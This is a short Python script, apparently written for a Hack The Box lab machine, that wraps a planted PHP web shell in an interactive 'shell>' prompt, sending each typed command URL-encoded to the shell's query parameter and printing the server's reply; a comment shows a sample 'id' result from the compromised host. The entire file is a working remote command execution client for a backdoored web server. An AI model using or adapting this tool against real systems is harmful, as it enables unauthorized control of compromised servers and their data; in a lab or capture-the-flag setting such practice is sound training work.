#!/usr/bin/env python3
#usage python3 cmdshell.py -t http://sec03.rentahacker.htb/shell.php?hidden=
#shell> id
#uid=1003(ib01c03) gid=1004(customers) groups=1004(customers)

import requests 
import argparse
from urllib.parse import quote
from cmd import Cmd

parser = argparse.ArgumentParser()
parser.add_argument("-t","--target", help="provide the exact url location of the webshell i.e. http://<host>/shell.php?cmd=", required=True)
cmdargs = parser.parse_args()

class Terminal(Cmd):
 def __init__(self):
   self.prompt = "shell> "
   Cmd.__init__(self)

 def default(self, args):
       r = requests.post(cmdargs.target + quote(args)) 
       print(r.text)

terminal = Terminal()
terminal.cmdloop()
